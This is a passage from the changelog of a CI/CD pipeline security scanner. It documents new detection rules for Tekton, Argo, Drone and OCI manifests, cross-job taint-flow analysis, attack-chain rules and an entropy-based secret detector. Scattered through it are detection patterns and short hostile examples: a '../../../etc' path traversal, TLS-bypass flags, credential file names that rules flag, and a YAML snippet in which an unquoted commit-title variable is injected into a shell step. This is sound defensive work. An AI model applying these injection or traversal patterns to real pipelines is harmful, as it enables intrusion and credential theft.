    pick which runner pool runs the build; closes parity
    with GHA-036, GL-032, JF-032, ADO-030, CC-031.
  - **TKN-015 workspace subPath param injection.** Flags
    Tekton steps that interpolate ``$(params.x)`` into a
    workspace ``subPath:``. A parameter-driven sub-path lets
    a pusher traverse outside the shared workspace mount
    (``../../../etc`` substitutes literally before the
    volume mount happens). TKN-003 catches the same param
    in script bodies; TKN-015 covers the file-system
    breakout vector that script-only detection misses.
  - **ARGO-015 insecure artifact URL.** Flags Argo template
    inputs that pull artifacts over plain HTTP, the legacy
    git:// protocol, or S3 with ``insecure: true``. Argo
    runs whatever bytes arrive without an integrity check
    unless the source provides one, so cleartext fetches
    let an on-path attacker swap the payload.

  Catalog: Buildkite 14 -> 15, Tekton 14 -> 15, Argo 14 -> 15.

- **OCI manifest coverage 6 -> 8.** Two new manifest-only
  rules:

  - **OCI-007 legacy schemaVersion 1.** Flags Docker
    Distribution v1 manifests (anything with
    ``schemaVersion`` not equal to 2). v1 manifests predate
    content-addressed layer descriptors, so a pull has no
    way to detect tampering between the registry and the
    runtime. Registries have been refusing v1 pushes for
    years, but a pre-existing v1 image can still sit in a
    private registry and get promoted; this catches it.
  - **OCI-008 weak digest algorithm.** Flags any descriptor
    (config / layer / sub-manifest) whose ``digest:`` uses
    something other than ``sha256:`` or ``sha512:``. ``sha1:``
    and ``md5:`` were never permitted by the OCI spec but
    occasionally show up in mirror exports and forensic JSON;
    a manifest that pins a layer by sha1 lets a colliding
    blob be substituted without changing the manifest.

- **Cross-provider lockfile-bypass parity (BK-014, TKN-014,
  ARGO-014).** Three new rules port the unpinned-package-
  install detection (already shipping for GHA / GitLab /
  Bitbucket / Azure / Jenkins / CircleCI / Cloud Build /
  Drone) to the three remaining container-flavored
  providers. All three reuse the cross-provider primitives
  ``PKG_INSECURE_RE`` and ``PKG_NO_LOCKFILE_RE`` from
  ``checks/base.py`` so detection stays consistent: bare
  ``npm install`` (should be ``npm ci``), ``pip install
  --trusted-host``, ``yarn install`` without ``--frozen-
  lockfile``, ``cargo install`` / ``go install`` without a
  pin, etc. Buildkite walks command steps, Tekton walks
  step scripts on Task / ClusterTask docs only, and Argo
  walks ``script.source`` plus joined ``container.args`` /
  ``container.command`` per template.

  Catalog: Buildkite 13 -> 14, Tekton 13 -> 14, Argo 13 -> 14.
  OpenSSF Scorecard ``Pinned-Dependencies`` coverage now
  includes every provider's lockfile-bypass rule (was a
  60% gap before, hits 100% with this).

- **Drone CI coverage 7 -> 10.** Three new rules close
  long-standing gaps relative to the GHA / GitLab packs:

  - **DR-008 pull: never policy.** Flags steps and services
    declaring ``pull: never`` (or the deprecated boolean
    ``pull: false`` synonym Drone treats as ``never``). The
    policy tells the Drone agent to skip the registry round-
    trip and run cached image bytes without re-verifying the
    digest, so any image that ever landed in the local cache
    keeps running until manual intervention. ``pull: always``
    (the Drone default) and ``pull: if-not-exists`` are
    treated as acceptable; the latter pairs naturally with
    DR-001's digest pinning.
  - **DR-009 tainted cache key.** Flags cache-plugin steps
    (``meltwater/drone-cache``, ``drillster/drone-volume-
    cache``, etc.) whose ``settings.cache_key`` /
    ``restore_keys`` interpolate attacker-controllable Drone
    variables (``$DRONE_BRANCH``, ``$DRONE_PULL_REQUEST_*``,
    ``$DRONE_COMMIT_MESSAGE``, ``$DRONE_TAG``, …). A pusher
    that controls the cache key controls which cache slot
    they read from, enabling cache poisoning. Trusted vars
    (``DRONE_BUILD_NUMBER``, ``DRONE_REPO_*``) are allow-
    listed; static keys pass.
  - **DR-010 unpinned package install.** Reuses the cross-
    provider ``PKG_INSECURE_RE`` and ``PKG_NO_LOCKFILE_RE``
    primitives to flag bare ``npm install`` (should be
    ``npm ci``), ``pip install --trusted-host`` /
    ``--index-url http://``, ``yarn install`` without
    ``--frozen-lockfile``, ``bundle install`` without
    ``--frozen``, ``cargo install`` / ``go install`` without
    a tag/commit pin, and similar shapes. Closes parity with
    GHA-021/022, GL-021/022 (and the same pack across
    Bitbucket / Azure / Jenkins / CircleCI / Cloud Build /
    Buildkite / Tekton / Argo).

- **TAINT-008 GitLab extends-chain taint.** New rule. GL-002
  catches direct interpolation when the tainted variable is
  declared on the consuming job (or globally), but it doesn't
  follow GitLab's ``extends:`` template-inheritance channel.
  Pattern this rule covers:

      .base:
        variables:
          TITLE: $CI_COMMIT_TITLE         # tainted, hidden template

      build:
        extends: .base
        script:
          - echo Building $TITLE          # GL-002 misses; TITLE
                                          # not in this job's
                                          # variables block

  ``iter_jobs`` skips hidden templates (the ``.``-prefix
  convention), so the tainted ``variables:`` block in
  ``.base`` is invisible to single-job rules. TAINT-008
  resolves each non-hidden job's ``extends:`` chain
  transitively (handling list-form ``extends: [a, b]``,
  multi-level chains, and pathological cycles via a visited
  set), gathers tainted variables from every link, and walks
  the consuming job's ``before_script:`` / ``script:`` /
  ``after_script:`` for unquoted references. Quote-state
  aware: ``"$TITLE"`` consumers pass; only unquoted
  references fire. v1 limitations: ``include:`` cross-
  pipeline file inclusion isn't tracked yet.

  GitLab provider catalog: 33 -> 34. The TAINT-NNN family
  now spans 8 rules across 5 providers (GHA: 1/2/3, GitLab:
  4/8, Buildkite: 5, Tekton: 6, Argo: 7).
- **TAINT-003 resolver-coupled callee analysis.** TAINT-003
  now does cross-workflow analysis when the callee body is
  loaded into the same scan (local references via
  ``--gha-path``, remote references via ``--resolve-remote``).
  For each tainted ``with:`` forward, the rule resolves the
  matching callee in ``ctx.workflows`` (matching by
  ``source_ref`` for remote refs, path-suffix for local refs),
  walks the callee's ``run:`` and ``with:`` bodies for unquoted
  ``${{ inputs.<name> }}`` references, and tags the path
  accordingly:

    * **Confirmed** (HIGH confidence) — the callee actually
      consumes the forwarded input in a sink, end-to-end
      injection chain proven.
    * **Unconfirmed** (MEDIUM confidence) — either the callee
      wasn't loaded, or the callee body doesn't reference the
      forwarded input in any sink. Still a risk surface (a
      future change to the callee could expose it) but the
      end-to-end chain isn't proven.

  Description shape: ``[CONFIRMED in <callee-path>] <chain>``
  vs ``[UNCONFIRMED] <chain>``, plus a header counting
  confirmed vs unconfirmed paths. ``Finding.confidence_locked``
  is set so the centralized confidence demoter doesn't flatten
  the deliberate split.

  Closes the v1 limitation noted in the original TAINT-003
  ROADMAP entry. The orchestrator gained a 4-arg rule
  signature (``check(path, doc, wf, ctx)``) so future rules
  needing cross-workflow analysis can opt in the same way;
  existing 2- and 3-arg rules dispatch unchanged.

- **DR-007 Drone sensitive host-path mount.** New Drone rule.
  Pipeline-level ``volumes:`` declarations of the form
  ``host: { path: <sensitive> }`` (Docker socket,
  ``/var/lib/docker``, ``/var/run``, ``/etc``, ``/proc``,
  ``/sys``, ``/``) are container-escape primitives equivalent
  to GHA-026 / BK-005. Detection uses prefix-with-segment-
  boundary matching so subpaths under a sensitive root also
  fire (``/var/lib/docker/volumes`` -> yes;
  ``/var-foo`` -> no). Description names which step or
  service mounts the volume; a declared-but-unmounted volume
  still fires (the runner's allow-bind config is itself the
  risk shape). Drone catalog: 6 -> 7.
- **TAINT-007 Argo cross-template ``outputs.parameters`` taint flow.**
  Fifth TAINT-engine port. New
  ``pipeline_check.core.checks.argo._taint_graph`` follows
  Argo's canonical cross-template channel:
  ``{{tasks.<task>.outputs.parameters.<output>}}`` substitution
  inside DAG / Steps orchestrators. A producer template's
  ``script.source`` interpolates ``{{inputs.parameters.<X>}}``
  and writes the value to an output parameter; a downstream
  task references the output via the cross-task substitution;
  the consumer template's script interpolates the value back
  into shell. ARGO-005 catches the producer's inner
  interpolation; TAINT-007 catches the actual cross-template
  injection at the consumer. Three-pass walk: producer
  classification, task-to-template forwarding resolution,
  consumer-side script reference matching. Both ``dag.tasks``
  and ``steps:`` orchestrator shapes are covered.
  v1 limitations: ``workflowTemplateRef:`` cross-document
  references aren't resolved; ``onExit:`` exit handlers
  aren't yet walked; artifact-based propagation
  (``artifacts.parameters``) is out of scope. The
  ``TAINT-NNN`` family now spans GHA (TAINT-001..003), GitLab
  CI (TAINT-004), Buildkite (TAINT-005), Tekton (TAINT-006),
  and Argo (TAINT-007), 5 distinct providers and 5 distinct
  propagation channels sharing one engine shape.
- **TAINT-006 Tekton results cross-task taint flow.** Fourth
  TAINT-engine port. New
  ``pipeline_check.core.checks.tekton._taint_graph`` follows
  Tekton's canonical inter-task channel:
  ``$(tasks.<task>.results.<output>)`` substitution. A producer
  task's inline ``taskSpec.steps[*].script`` writes to
  ``$(results.<X>.path)`` from a ``$(params.<Y>)`` reference;
  the Pipeline forward the result to a downstream task's
  ``params:`` via ``$(tasks.<producer>.results.<X>)``; the
  downstream task's script references its own param unquoted.
  TKN-003 catches the producer's inner interpolation; TAINT-006
  catches the cross-task injection at the consumer.
  v1 limitations: only inline ``taskSpec:`` is walked
  (``taskRef:`` cross-document resolution would need the same
  machinery as the GHA ``--resolve-remote`` flow); ``finally:``
  blocks aren't walked yet. The ``TAINT-NNN`` family now spans
  GHA (TAINT-001..003), GitLab CI (TAINT-004), Buildkite
  (TAINT-005), and Tekton (TAINT-006), four distinct
  propagation channels sharing the same producer-consumer
  engine shape.
- **TAINT-005 Buildkite meta-data cross-step taint flow.** Third
  TAINT-engine port. New
  ``pipeline_check.core.checks.buildkite._taint_graph`` follows
  Buildkite's per-build meta-data store: a producer step writes
  ``buildkite-agent meta-data set "K" "$BUILDKITE_PULL_REQUEST"``
  (or any tainted ``BUILDKITE_*`` source from BK-003's
  vocabulary) and a downstream step's
  ``buildkite-agent meta-data get K`` reads it back. BK-003
  catches the producer's inner ``$BUILDKITE_*`` interpolation;
  TAINT-005 catches the cross-step injection at the consumer
  (the ``$(buildkite-agent meta-data get ...)`` capture looks
  like an ordinary shell variable until the meta-data round-
  trip is traced). Buildkite meta-data is per-build, not
  per-step; the engine doesn't model temporal ordering and
  fires when a tainted set + a get on the same key both exist
  in the pipeline. The TAINT-NNN family now spans GHA
  (TAINT-001..003), GitLab CI (TAINT-004), and Buildkite
  (TAINT-005), all sharing the same producer-consumer engine
  shape across distinct provider channels (``$GITHUB_OUTPUT``,
  dotenv artifact, meta-data store).
- **TAINT-004 GitLab dotenv cross-job taint flow.** First v0.6.0
  taint-engine port to a second provider. New
  ``pipeline_check.core.checks.gitlab._taint_graph`` mirrors the
  GHA shape but follows GitLab's canonical cross-job channel:
  ``artifacts.reports.dotenv``. A producer job that writes
  ``KEY=$CI_COMMIT_TITLE`` (or any ``$CI_COMMIT_*`` /
  ``$CI_MERGE_REQUEST_*`` source) to a file declared as a
  dotenv artifact leaks the variable into every downstream job
  that ``needs:`` (or ``dependencies:``) the producer. The
  consumer's ``$KEY`` reference looks like an ordinary shell
  variable until the artifact path is traced; ``GL-002`` only
  catches the inner ``$CI_COMMIT_*`` interpolation in the
  producer, ``TAINT-004`` catches the actual injection at the
  consumer. Quote-state aware: a quoted ``"$KEY"`` consumer
  passes; only unquoted references fire. v1 limitations:
  ``extends:`` job-template inheritance and ``include:``
  cross-pipeline references aren't tracked yet, ``trigger:``
  parent-child pipelines aren't either, and the dotenv path
  match is literal (no glob expansion). The ``TAINT-NNN``
  family now spans GHA (TAINT-001..003) and GitLab CI
  (TAINT-004), validating the engine's portability across
  provider shapes.
- **TAINT-003 reusable-workflow input forwarding.** The GHA
  dataflow engine now flags caller workflows that pipe an
  attacker-controllable source into a reusable workflow's
  ``with:`` block. ``jobs.<id>.uses: <callee>`` references with
  tainted ``with:`` values (direct ``${{ github.event.* }}``
  interpolation, or a forwarded tainted step output / cross-job
  ``needs.<id>.outputs.<name>``) emit one ``TAINT-003`` finding
  per tainted input, naming the callee so the operator can
  audit the matching ``inputs.<name>`` consumer. Caller-side
  detection only in v1; coupling to the callee body's actual
  consumption sites is the next engine extension. The three
  TAINT rules are mutually exclusive on a given path: TAINT-001
  for same-job step-output flow, TAINT-002 for cross-job
  ``jobs.<id>.outputs:`` propagation, TAINT-003 for tainted
  ``with:`` forward into reusable workflows.
- **XPC-003 unverified Helm release flow.** Third XPC chain.
  Fires when ``HELM-002`` (Chart.lock missing per-dependency
  digests) and ``OCI-002`` (image manifest lacks attestation
  manifest) both fail in the same scan run. Composite says:
  chart contents AND image bytes are independently mutable;
  consumers running ``helm install`` have no signed chain of
  custody at either boundary. One chain entry per ``(chart,
  manifest)`` cross-product pair. Roadmap originally proposed
  pairing HELM-002 with a "helm-upgrade step" rule that doesn't
  exist; OCI-002 ended up the cleaner second leg because both
  rules are squarely about provenance gaps.
- **TAINT-002 cross-job output propagation.** The GHA dataflow
  engine now follows ``jobs.<id>.outputs:`` declarations so a
  step output that surfaces as a job output and is consumed in a
  downstream job via ``${{ needs.<id>.outputs.<name> }}`` is
  detected as a separate ``TAINT-002`` finding. ``TAINT-001``
  stays scoped to same-job step-output flow; the rules are
  mutually exclusive on a given path so they don't double-fire.
  Engine adds a third pass tracking job-output taint with two
  inheritance channels: a ``${{ steps.<id>.outputs.<name> }}``
  reference picks up the producing step's taint, and a direct
  ``${{ github.event.* }}`` interpolation in the job-output
  declaration is also tracked. Same source vocabulary,
  ``UNTRUSTED_CONTEXT_RE``, that GHA-003 / TAINT-001 use.
- **XPC-002 tag-mutability cross-provider chain.** Second
  cross-provider chain (``XPC-NNN`` family). Fires when a
  multi-provider run carries both ``DF-001`` (Dockerfile
  floating ``FROM`` tag) and ``K8S-001`` (Kubernetes workload
  uses a floating-tag image) failures. The composite says: tag
  mutability spans build- and runtime layers, an attacker who
  pushes malicious bytes under a known tag affects both the
  build artifact and the running cluster with no separate
  compensating control. One chain entry per
  ``(dockerfile, manifest)`` cross-product pair.
- **Multi-provider scan mode.** New ``--pipelines github,oci``
  CLI flag (plural, comma-separated, mutually exclusive with the
  single-valued ``--pipeline``) scans every named provider in one
  invocation and evaluates the chain engine once over the union
  of all sub-scan findings. That's what activates the
  cross-provider attack-chain family ``XPC-NNN``, single-provider
  runs of ``--pipeline github`` or ``--pipeline oci`` alone never
  see both check IDs in the chain engine's input. Each provider's
  path flag is auto-detected the same way as in single-provider
  mode; the per-provider auto-detection runs once per name in
  the list. Implementation: new ``MultiScanner`` in
  ``pipeline_check.core.scanner`` that delegates each sub-scan
  to :class:`Scanner` with chain evaluation suppressed, then
  evaluates chains once over the unified findings. Aggregate
  ``ScanMetadata`` and ``inventory()`` are exposed on the
  multi-scanner so reporters consume the same shape regardless
  of single- vs multi-mode. Backward-compatible: every existing
  ``--pipeline X`` invocation behaves unchanged.
- **TAINT-001 / dataflow taint engine for GHA.** First v0.6.0
  vision item, *landed early on dev*. New per-workflow taint
  graph (``pipeline_check.core.checks.github._taint_graph``)
  generalizes the existing GHA-003 single-step interpolation
  detector to a workflow-wide reachability problem: track
  ``${{ github.event.* }}`` source expressions through
  ``$GITHUB_OUTPUT`` writes (and the legacy ``::set-output``
  workflow-command shape), find downstream consumer steps that
  reference ``${{ steps.<id>.outputs.<name> }}``, emit one
  ``TAINT-001`` finding per source-to-sink path. Self-step
  references stay GHA-003 territory; the engine's contribution
  is the cross-step gap. v1 covers ``run:`` and ``with:`` sinks
  on same-job step outputs; cross-job ``jobs.<id>.outputs.*``
  forwarding and reusable-workflow input/output propagation are
  roadmapped under v0.6.0 vision.
- **XPC-001 cross-provider attack-chain rule.** Second v0.6.0
  vision item. A new chain rule under
  ``pipeline_check.core.chains.rules.xpc001_*`` fires when both
  GHA-006 (workflow doesn't emit SLSA provenance) and OCI-002
  (image manifest lacks attestation manifest) fail in the same
  scan. Composite "deploy without verifiable provenance" with
  HIGH severity. Currently only fires when the user feeds
  findings from both providers into the chain engine; the
  multi-provider scan mode that activates this in the default
  CLI flow is on the v0.6.0 roadmap.
- **HTML report blast-radius heatmap.** Third v0.6.0 vision
  item, v1 *landed*. Inserts a per-resource SVG heatmap
  between the attack-chains panel and the findings table. One
  tile per resource with a failing finding, color-coded by
  worst severity, sized by failing-finding count
  (sqrt-scaled), tooltip on hover shows the per-severity
  breakdown. Pure inline SVG so the report stays a single
  offline HTML file. The v2 step-level pipeline DAG (steps as
  nodes, ``needs:`` / ``depends_on`` as edges) is roadmapped;
  v1 keeps the Scanner-to-reporter API unchanged.
- **Drone CI provider.** New ``--pipeline drone --drone-path
  <file>`` reads ``.drone.yml`` / ``.drone.yaml`` documents on
  disk. Drone pipelines are multi-document YAML; each document
  is gated by ``kind: pipeline`` and a ``type:`` discriminator.
  Auto-detects ``./.drone.yml`` so a no-args ``pipeline_check``
  in a Drone repo picks the provider without manual flagging.
  Six checks:

    * ``DR-001`` step image not pinned to ``@sha256:<digest>``
      (HIGH; covers steps and services).
    * ``DR-002`` ``privileged: true`` on a step or service
      (HIGH; container escape primitive).
    * ``DR-003`` author-controllable Drone template variable
      interpolated unquoted in a shell command (HIGH;
      ``${DRONE_PULL_REQUEST_TITLE}``, ``DRONE_COMMIT_*``,
      branch / repo names in fork PRs, tag annotations). Same
      injection model as TKN-003 / ARGO-005 / BK-003.
    * ``DR-004`` literal credential in step ``environment:`` /
      plugin ``settings:`` / pipeline-level ``environment:``
      (CRITICAL; vocabulary match plus AKIA-prefixed AWS keys).
    * ``DR-005`` plugin step (one with a ``settings:`` block)
      uses a floating image tag (HIGH; plugin steps receive
      every ``settings:`` key as an env var, so a swapped
      plugin image can exfiltrate the entire credential set).
    * ``DR-006`` TLS verification disabled in step commands
      (HIGH; ``curl -k``, ``--no-check-certificate``,
      ``GIT_SSL_NO_VERIFY``, ``NODE_TLS_REJECT_UNAUTHORIZED``,
      etc., reuses the cross-provider ``TLS_BYPASS_RE``).

  ``ssh`` / ``exec`` / ``digitalocean`` pipelines have no
  container surface; rules that target ``image:`` / commands
  pass-by-default on those types so a non-container Drone
  pipeline doesn't generate noise. Provider catalog: 17 to 18.
- **Three more OCI manifest rules.** ``OCI-004`` flags layers
  that declare a ``urls:`` field or use a foreign-layer media
  type (``vnd.docker.image.rootfs.foreign.diff.tar.gzip``,
  ``vnd.oci.image.layer.nondistributable.v1.tar+gzip``).
  Foreign-layer references pull blobs from arbitrary HTTP
  endpoints at image-pull time, bypassing the registry's
  content-addressed store; HIGH severity since an attacker who
  controls the URL endpoint can cloak content per-client or
  break image pulls. ``OCI-005`` flags missing
  ``org.opencontainers.image.licenses`` annotations (LOW; SBOM
  / registry-UI hygiene). ``OCI-006`` flags single-image
  manifests with more than 40 layers (LOW; flags Dockerfile
  RUN-step sprawl, indexes pass-by-default since they have no
  layers themselves). OCI catalog: 3 to 6.
- **OCI image manifest provider.** New ``--pipeline oci
  --oci-manifest <file>`` reads an OCI image manifest /
  image-index JSON document captured via
  ``docker buildx imagetools inspect --raw <ref>`` (or the
  equivalent ``oras manifest fetch`` / ``crane manifest``). Pure
  parser, no registry pull, no daemon access; auto-detects
  ``./index.json`` in a directory. Three checks: ``OCI-001``
  flags missing ``org.opencontainers.image.source`` /
  ``image.revision`` annotations on the manifest (mirrors DF-016
  at the image-manifest layer so a build that overrides the
  Dockerfile's ``LABEL`` lines via ``docker buildx --annotation``
  is still scored); ``OCI-002`` flags an image index with no
  BuildKit-style attestation-manifest sub-entry
  (``vnd.docker.reference.type: attestation-manifest``), where
  SLSA provenance and SBOM data live; ``OCI-003`` flags a missing
  ``org.opencontainers.image.created`` timestamp (CVE triage
  needs the build date, the lightest provenance signal that
  doesn't require pulling the config blob). Recognizes both the
  OCI 1.0 / 1.1 spec media types and the
  ``application/vnd.docker.distribution.manifest.{,list.}v2+json``
  shapes BuildKit still emits by default. Provider catalog: 16
  to 17 (added 3 new OCI-* rules).
- **Real performance benchmark gate.**
  ``tests/perf/test_benchmark.py`` replaces the older smoke test
  with a ``pytest-benchmark`` run on a 1000-line synthetic GHA
  workflow and a 5000-line synthetic CFN template, asserting
  absolute median ceilings (5s / 8s, sized for slow CI; locally
  each scan completes in ~17ms / ~2ms). Measurement uses
  ``benchmark.pedantic`` (warmup + multiple rounds + median) so
  a CI-run failure includes ops/sec and median wall time, not
  just a pass/fail. Developers can save a per-machine baseline
  with ``pytest tests/perf/test_benchmark.py --benchmark-autosave``
  and gate against it with ``pytest tests/perf/test_benchmark.py
  --benchmark-compare --benchmark-compare-fail=median:25%`` to
  detect regressions vs the saved JSON. CI doesn't save baselines
  (they'd flap as GitHub-hosted runner hardware shifts) and
  relies on the absolute ceilings instead. Adds
  ``pytest-benchmark>=5.0`` to ``requirements-dev.in`` /
  ``-dev.txt``.
- **Entropy-detector vocabulary tightened after calibration.**
  Calibration sweep against the project's own fixture corpus
  surfaced 9 false positives on ``secure.yaml`` Kubernetes
  manifests, all from the heuristic matching ``api`` standalone
  inside ``apiVersion`` / ``apiGroups`` and ``private`` standalone
  inside ``private_subnet`` / ``private_dns_zone`` /
  ``privateLink``. The K8s / Argo / Tekton manifest schemas use
  ``apiVersion`` and ``apiGroups`` as ubiquitous structural
  fields, and cloud networking configs use ``private_*`` as a
  prefix for non-credential infrastructure. Both standalone
  tokens get dropped from ``_CRED_KEY_TOKENS`` while real
  credential-named fields (``api_key``, ``apiSecret``,
  ``private_key``, ``private_token``) still fire because their
  OTHER part (``key``, ``secret``, ``token``) carries the
  heuristic. Calibration after the fix: synthetic
  ground-truth set holds at 100% recall + 100% precision; the
  fixture corpus drops from 9 false positives to 0; the repo's
  own configs drop from 21 entropy hits to 4 (all true positives:
  the existing AWS canonical example secret + the three
  intentionally-bad fixtures). 9 new negative test cases lock
  the contract.
- **``--detect-entropy`` opt-in Shannon-entropy secret detector.**
  Adds a second pass to ``find_secret_values`` that flags
  high-entropy values (>= 3.5 bits/char, length >= 20) appearing
  in YAML key contexts that suggest a credential
  (``API_KEY``, ``apiToken``, ``database-password``, ...) and
  that the deterministic prefix-shape catalog hasn't already
  matched. Catches the "custom org token with no public prefix"
  case: an internal Snowflake token, custom JWT issuer secret,
  opaque session token, etc., that today only fires if the
  operator pre-registers a regex via ``--secret-pattern``.
  Layered FP suppression — four independent gates, each catching
  a different class of false positive:
  - **Key-context match**: the YAML key name (after splitting on
    ``-`` / ``_`` / camel-case boundaries) must contain a part
    matching the credential vocabulary
    (``key`` / ``token`` / ``secret`` / ``password`` / ``auth``
    / ``api`` / ``credential`` / ``private`` / ``passkey`` /
    ``accesskey`` / ``secretkey``). Filters out random-looking
    values in non-credential fields (commit SHAs in
    ``version:``, hashes in ``id:``).
  - **Length floor** (>= 20 chars). Filters out short hex IDs
    even though they're technically high-entropy.
  - **Token shape** (``[A-Za-z0-9+/=_\-.]+``). Filters out
    encoded paths, templated config strings, log lines.
  - **No deterministic-detector overlap**. If the value already
    matches one of the 51 prefix-shape detectors, only the
    deterministic label fires (the more useful one).
  Plus the existing ``PLACEHOLDER_MARKER_RE`` suppression for
  ``replaceme`` / ``<your-key>`` / etc.
  Hits are labeled ``entropy:<redacted>`` so reporters can
  distinguish them from prefix-matched hits and operators can
  write targeted ``--ignore-file`` rules. Off by default —
  turning it on can introduce new findings on previously-clean
  scans, so the upgrade is opt-in only. The Kubernetes / CFN /
  Terraform envvar shape (``[{name: K, value: V}, ...]``) gets
  special handling: the walker biases toward the sibling
  ``name`` field as the credential-context label, so
  ``{name: DATABASE_PASSWORD, value: <token>}`` correctly reads
  as ``DATABASE_PASSWORD: <token>`` for the heuristic. 52 new
  tests in ``tests/test_entropy_detection.py`` cover the math,
  the key heuristic (15 positive + 11 negative cases), the
  layered FP suppression (7 cases), the off-by-default
  contract, the K8s envvar-list shape, and the
  ``reset_patterns`` lifecycle hook (so a Lambda container
  doesn't leak the toggle across invocations).
- **``--ai-explain CHECK_ID`` opt-in AI augmentation layer.**
  First non-deterministic feature in the catalog, structured to
  preserve the determinism the rest of the tool depends on.
  Prints the existing ``--explain`` body unchanged, then appends
  a clearly-framed ``[AI-generated, non-deterministic. Provider:
  <provider>:<model>. Treat as a triage aid, not as audit
  output.]`` section with project-specific remediation prose.
  Three providers, all opt-in, none on by default:
  - **Anthropic.** Default ``claude-sonnet-4-6``. Lazy-imports the
    ``anthropic`` SDK; install via
    ``pip install pipeline-check[ai-anthropic]``. Auth via
    ``$ANTHROPIC_API_KEY``.
  - **OpenAI.** Default ``gpt-4o-mini``. Lazy-imports ``openai``;
    install via ``pip install pipeline-check[ai-openai]``. Auth
    via ``$OPENAI_API_KEY``.
  - **Ollama.** Default ``llama3.2``. Stdlib-only HTTP client
    against ``$OLLAMA_HOST`` (defaults to
    ``http://localhost:11434``); no extra Python dep, no API key,
    no bytes leaving the host.
  Provider selection is explicit (``--ai-model anthropic`` or
  ``provider:model``) or implicit via
  ``$PIPELINE_CHECK_AI_MODEL`` / whichever provider key happens
  to be set. The prompt includes the rule's metadata, the first
  60 lines of ``README.*``, and the first 200 lines of an optional
  ``--ai-context-file PATH`` so the model can ground its
  recommendation in the actual codebase. Context-file is
  validated as an existing readable path before any AI call
  fires. Failure modes (missing SDK, missing key, unknown
  provider, request failure) all exit code 4 with a clear error
  shaped for CI logs, distinct from the deterministic
  ``--explain``'s exit code 3 for unknown IDs.
  Determinism boundary: the ``--explain``, ``--list-checks``,
  ``--list-standards``, JSON / SARIF / scoring / gating, and
  attack-chain paths are unaffected — verified by
  ``TestDeterminismContract`` in ``tests/test_ai_explain.py``,
  which asserts ``--explain GHA-001`` output never carries the
  AI banner and that no AI provider call fires unless
  ``--ai-explain`` was passed. 40 new tests cover spec parsing,
  default-provider resolution, prompt construction, README /
  context-file grounding, all three error paths, the CLI
  banner format, and the deterministic / AI-output separation.
  No new runtime dependencies on the default install.
- **AC-026 — Buildkite injection lands on auto-deploy step with no
  manual gate.** New cross-rule attack chain on the Buildkite
  surface, mirroring the AC-002 (GitHub) and AC-022 (GitLab)
  injection-meets-impact shape. Fires when the same
  ``pipeline.yml`` carries BK-003 (a step's ``command:``
  interpolates an untrusted Buildkite metadata variable —
  ``$BUILDKITE_MESSAGE``, ``$BUILDKITE_BRANCH``,
  ``$BUILDKITE_PULL_REQUEST_TITLE``, etc.) AND BK-007 (a deploy-
  named step has no ``manual:`` or ``input:`` gate). Combined,
  anyone who can land a commit on a branch the pipeline runs
  against supplies the injection vector AND triggers the
  unattended deploy in the same run; the injected command
  executes with the deploy step's credentials. Closes a real
  catalog gap: every CI provider with both primitives can
  compose this chain, but until now the catalog covered GitHub
  and GitLab and left Buildkite as the one provider with both
  ingredients but no chain. Severity CRITICAL, MITRE ``T1059`` /
  ``T1078`` / ``T1556``, kill-chain ``initial-access -> execution
  -> impact``. Auto-discovered; ``--explain BK-003`` and
  ``--explain BK-007`` now list AC-026 alongside their existing
  chain references; ``--list-chains`` and
  ``--explain-chain AC-026`` pick it up. Catalog 25 -> 26.
- **AC-027 — Image bakes a credential file AND exposes a remote-
  access port.** First Dockerfile-side attack chain. Fires when
  the same ``Dockerfile`` carries DF-019 (a ``COPY`` / ``ADD``
  source path names a credential file: ``id_rsa``,
  ``.aws/credentials``, ``.npmrc``, ``.kube/config``, etc.) AND
  DF-013 (an ``EXPOSE`` declares a sensitive remote-access port:
  22 sshd, 23 telnet, 21 ftp, 3389 rdp, 5900 vnc, common database
  / cache / search ports). The image ships a key AND a way to
  reach it from the outside; pulling a public mirror or
  exfiltrating a single CI build artifact yields both halves of
  the credential-and-listener pair. Distinct kill-chain shape
  from the other 26 catalog chains: ``credential-access ->
  initial-access -> lateral-movement`` rather than the typical
  ``initial-access -> execution`` shape. Severity CRITICAL,
  MITRE ``T1552.001`` / ``T1078`` / ``T1190``. Auto-discovered;
  ``--explain DF-013`` and ``--explain DF-019`` now list AC-027.
  Catalog 26 -> 27. Dockerfile gains its first attack chain
  (provider went 0 -> 1).
- **Standards-mapping backfill rounds out BK / DF / HELM / GCB to
  the realistic ceiling.** Previous round closed NIST SSDF for
  the three thinnest packs; this round closes every other
  standard that semantically applies. After this commit each of
  Buildkite, Dockerfile, Helm, and Cloud Build maps to 12/14
  registered standards (the ``cis_aws_foundations`` and
  ``cis_kubernetes`` exceptions are intentional, those benchmarks
  are scoped to AWS and Kubernetes posture respectively and don't
  apply here).
  Eight standards files gained mappings:
  - **``cis_supply_chain``**: Dockerfile (18 rules → CIS sections
    1.4 / 2.1 / 2.3 / 4.4) and Cloud Build (26 rules) added; Helm
    expanded HELM-006..010.
  - **``esf_supply_chain``**: Dockerfile (15 rules) and Cloud
    Build (26) added; Helm expanded HELM-006..010.
  - **``nist_800_190``**: Dockerfile (17 rules — NIST 800-190
    Section 4.1 maps almost line-for-line to a Dockerfile's
    threat surface) and Buildkite (7 rules — runtime container
    concerns) added.
  - **``nist_csf_2``**: Dockerfile (19 rules) and Buildkite (13)
    added.
  - **``nist_ssdf``**: Cloud Build (26 rules) added — closes the
    last unmapped CI provider on this standard.
  - **``openssf_scorecard``**: Dockerfile (9 rules — Pinned-
    Dependencies / Dangerous-Workflow / Token-Permissions /
    SBOM) added.
  - **``pci_dss_v4``**: Dockerfile (14), Helm (6), and Cloud
    Build (20) added.
  - **``s2c2f``**: Dockerfile (6 — ING-1 / UPD-1 / REB-3) and
    Helm (6) added.
  - **``slsa``**: Dockerfile (6 — Build.L1.Provenance /
    L2.Signed / L3.NonFalsifiable / L3.Isolated) and Cloud
    Build (14) added.
  - **``soc2``**: Dockerfile (18) and Buildkite (13) added.
  Net 263 new mappings. Operators running ``--standard-report
  <name>`` will now see BK / DF / HELM / GCB findings annotated
  on every applicable framework rather than rendering as
  "unmapped".
- **NIST SSDF mappings backfilled for Buildkite, Dockerfile, and
  Helm.** All three packs previously had **zero** entries in
  ``nist_ssdf``: every BK / DF / HELM rule rendered as
  "unmapped" in ``--standard-report nist_ssdf``. 43 new
  mappings close the gap (BK 13, DF 20, HELM 10), routed
  across SSDF practice areas:
  - PW.4.* (acquire and verify 3rd-party components) for
    pinning rules and curl-pipe / TLS-bypass shapes
    (BK-001 / BK-004 / BK-008 / DF-001 / DF-003 / DF-004 /
